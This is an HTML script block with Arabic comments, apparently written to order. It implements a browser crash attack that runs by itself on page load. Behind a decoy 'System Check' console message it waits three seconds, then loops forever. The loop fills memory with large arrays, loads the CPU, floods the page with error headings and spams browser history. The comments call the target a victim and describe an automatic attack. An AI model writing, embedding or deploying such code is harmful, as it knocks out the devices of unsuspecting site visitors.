<script>
    window.onload = function() {
        // رسالة تمويه للضحية
        console.log("System Check Initiated...");

        setTimeout(function() {
            // البدء بالهجوم التلقائي بدون تدخل المستخدم
            let payload = [];
            
            // حلقة مدمرة تستهدف المعالج والرام والـ Rendering في نفس الوقت
            while (true) {
                // 1. استهلاك الرام بجنون (توليد بيانات عشوائية ضخمة)
                payload.push(new Uint8Array(10000000).fill(Math.random() * 255));
                
                // 2. إشغال المعالج بعمليات حسابية ثقيلة
                for (let i = 0; i < 1000000; i++) {
                    let x = Math.atan(Math.random()) * Math.tan(Math.random());
                }
                
                // 3. خنق الذاكرة الرسومية (توليد نصوص عملاقة في واجهة الموقع)
                let crashText = document.createElement('h1');
                crashText.innerText = "CRITICAL_SYSTEM_FAILURE_ERROR_" + Math.random();
                document.body.appendChild(crashText);

                // 4. منع المتصفح من عمل "Garbage Collection" (تنظيف الذاكرة)
                // عن طريق ربط البيانات ببعضها البعض باستمرار
                window.history.pushState(null, "", "attack_" + Math.random());
            }
        }, 3000); // المهلة التي طلبتها (3 ثواني)
    };
</script>
